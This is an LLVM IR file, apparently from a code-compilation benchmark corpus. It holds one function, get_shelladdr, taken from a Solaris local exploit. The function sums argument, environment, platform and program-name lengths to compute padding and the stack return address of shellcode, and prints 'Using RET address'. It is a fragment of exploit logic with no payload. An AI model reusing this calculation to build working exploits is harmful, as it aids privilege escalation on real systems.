; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_21058.c_get_shelladdr.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_21058.c_get_shelladdr.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [32 x i8] c"shellcode address padding = %d\0A\00", align 1
@SI_PLATFORM = common dso_local global i32 0, align 4
@VULPROG = common dso_local global i8* null, align 8
@.str.1 = private unnamed_addr constant [31 x i8] c"stack arguments len = %#x(%d)\0A\00", align 1
@.str.2 = private unnamed_addr constant [32 x i8] c"the padding zeros number = %d\0A\0A\00", align 1
@.str.3 = private unnamed_addr constant [26 x i8] c"Using RET address = 0x%x\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i64 @get_shelladdr(i64 %0, i8** %1, i8** %2) #0 {
  %4 = alloca i64, align 8
  %5 = alloca i8**, align 8
  %6 = alloca i8**, align 8
  %7 = alloca i64, align 8
  %8 = alloca i32, align 4
  %9 = alloca [256 x i8], align 16
  %10 = alloca i8, align 1
  %11 = alloca i8, align 1
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  store i64 %0, i64* %4, align 8
  store i8** %1, i8*** %5, align 8
  store i8** %2, i8*** %6, align 8
  store i8 0, i8* %10, align 1
  store i32 0, i32* %8, align 4
  store i32 0, i32* %13, align 4
  br label %15

15:                                               ; preds = %32, %3
  %16 = load i8**, i8*** %5, align 8
  %17 = load i32, i32* %8, align 4
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds i8*, i8** %16, i64 %18
  %20 = load i8*, i8** %19, align 8
  %21 = icmp ne i8* %20, null
  br i1 %21, label %22, label %35

22:                                               ; preds = %15
  %23 = load i8**, i8*** %5, align 8
  %24 = load i32, i32* %8, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds i8*, i8** %23, i64 %25
  %27 = load i8*, i8** %26, align 8
  %28 = call i32 @strlen(i8* %27)
  %29 = add nsw i32 %28, 1
  %30 = load i32, i32* %13, align 4
  %31 = add nsw i32 %30, %29
  store i32 %31, i32* %13, align 4
  br label %32

32:                                               ; preds = %22
  %33 = load i32, i32* %8, align 4
  %34 = add nsw i32 %33, 1
  store i32 %34, i32* %8, align 4
  br label %15

35:                                               ; preds = %15
  %36 = load i32, i32* %13, align 4
  %37 = srem i32 %36, 4
  %38 = sub nsw i32 3, %37
  %39 = trunc i32 %38 to i8
  store i8 %39, i8* %10, align 1
  %40 = load i8, i8* %10, align 1
  %41 = sext i8 %40 to i64
  %42 = call i32 (i8*, i64, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str, i64 0, i64 0), i64 %41)
  %43 = load i8**, i8*** %6, align 8
  %44 = getelementptr inbounds i8*, i8** %43, i64 0
  %45 = load i8*, i8** %44, align 8
  %46 = load i8, i8* %10, align 1
  %47 = call i32 @memset(i8* %45, i8 signext 65, i8 signext %46)
  %48 = load i8**, i8*** %6, align 8
  %49 = getelementptr inbounds i8*, i8** %48, i64 0
  %50 = load i8*, i8** %49, align 8
  %51 = load i8, i8* %10, align 1
  %52 = sext i8 %51 to i64
  %53 = getelementptr inbounds i8, i8* %50, i64 %52
  store i8 0, i8* %53, align 1
  store i32 0, i32* %8, align 4
  store i32 0, i32* %12, align 4
  br label %54

54:                                               ; preds = %71, %35
  %55 = load i8**, i8*** %6, align 8
  %56 = load i32, i32* %8, align 4
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i8*, i8** %55, i64 %57
  %59 = load i8*, i8** %58, align 8
  %60 = icmp ne i8* %59, null
  br i1 %60, label %61, label %74

61:                                               ; preds = %54
  %62 = load i8**, i8*** %6, align 8
  %63 = load i32, i32* %8, align 4
  %64 = sext i32 %63 to i64
  %65 = getelementptr inbounds i8*, i8** %62, i64 %64
  %66 = load i8*, i8** %65, align 8
  %67 = call i32 @strlen(i8* %66)
  %68 = add nsw i32 %67, 1
  %69 = load i32, i32* %12, align 4
  %70 = add nsw i32 %69, %68
  store i32 %70, i32* %12, align 4
  br label %71

71:                                               ; preds = %61
  %72 = load i32, i32* %8, align 4
  %73 = add nsw i32 %72, 1
  store i32 %73, i32* %8, align 4
  br label %54

74:                                               ; preds = %54
  %75 = load i32, i32* @SI_PLATFORM, align 4
  %76 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 0
  %77 = call i32 @sysinfo(i32 %75, i8* %76, i32 256)
  %78 = load i32, i32* %13, align 4
  %79 = load i32, i32* %12, align 4
  %80 = add nsw i32 %78, %79
  %81 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 0
  %82 = call i32 @strlen(i8* %81)
  %83 = add nsw i32 %80, %82
  %84 = add nsw i32 %83, 1
  %85 = load i8*, i8** @VULPROG, align 8
  %86 = call i32 @strlen(i8* %85)
  %87 = add nsw i32 %84, %86
  %88 = add nsw i32 %87, 1
  store i32 %88, i32* %14, align 4
  %89 = load i32, i32* %14, align 4
  %90 = sext i32 %89 to i64
  %91 = load i32, i32* %14, align 4
  %92 = call i32 (i8*, i64, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.1, i64 0, i64 0), i64 %90, i32 %91)
  %93 = load i32, i32* %14, align 4
  %94 = srem i32 %93, 4
  %95 = trunc i32 %94 to i8
  store i8 %95, i8* %11, align 1
  %96 = load i8, i8* %11, align 1
  %97 = sext i8 %96 to i32
  %98 = icmp eq i32 %97, 3
  br i1 %98, label %99, label %100

99:                                               ; preds = %74
  store i8 5, i8* %11, align 1
  br label %105

100:                                              ; preds = %74
  %101 = load i8, i8* %11, align 1
  %102 = sext i8 %101 to i32
  %103 = sub nsw i32 4, %102
  %104 = trunc i32 %103 to i8
  store i8 %104, i8* %11, align 1
  br label %105

105:                                              ; preds = %100, %99
  %106 = load i8, i8* %11, align 1
  %107 = sext i8 %106 to i64
  %108 = call i32 (i8*, i64, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.2, i64 0, i64 0), i64 %107)
  %109 = load i64, i64* %4, align 8
  %110 = load i8, i8* %11, align 1
  %111 = sext i8 %110 to i64
  %112 = sub nsw i64 %109, %111
  %113 = load i8*, i8** @VULPROG, align 8
  %114 = call i32 @strlen(i8* %113)
  %115 = sext i32 %114 to i64
  %116 = sub nsw i64 %112, %115
  %117 = sub nsw i64 %116, 1
  %118 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 0
  %119 = call i32 @strlen(i8* %118)
  %120 = sext i32 %119 to i64
  %121 = sub nsw i64 %117, %120
  %122 = sub nsw i64 %121, 1
  store i64 %122, i64* %7, align 8
  %123 = load i32, i32* %8, align 4
  %124 = add nsw i32 %123, -1
  store i32 %124, i32* %8, align 4
  br label %125

125:                                              ; preds = %139, %105
  %126 = load i32, i32* %8, align 4
  %127 = icmp sgt i32 %126, 0
  br i1 %127, label %128, label %142

128:                                              ; preds = %125
  %129 = load i8**, i8*** %6, align 8
  %130 = load i32, i32* %8, align 4
  %131 = sext i32 %130 to i64
  %132 = getelementptr inbounds i8*, i8** %129, i64 %131
  %133 = load i8*, i8** %132, align 8
  %134 = call i32 @strlen(i8* %133)
  %135 = add nsw i32 %134, 1
  %136 = sext i32 %135 to i64
  %137 = load i64, i64* %7, align 8
  %138 = sub nsw i64 %137, %136
  store i64 %138, i64* %7, align 8
  br label %139

139:                                              ; preds = %128
  %140 = load i32, i32* %8, align 4
  %141 = add nsw i32 %140, -1
  store i32 %141, i32* %8, align 4
  br label %125

142:                                              ; preds = %125
  %143 = load i64, i64* %7, align 8
  %144 = call i32 (i8*, i64, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.3, i64 0, i64 0), i64 %143)
  %145 = load i64, i64* %7, align 8
  ret i64 %145
}

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @printf(i8*, i64, ...) #1

declare dso_local i32 @memset(i8*, i8 signext, i8 signext) #1

declare dso_local i32 @sysinfo(i32, i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
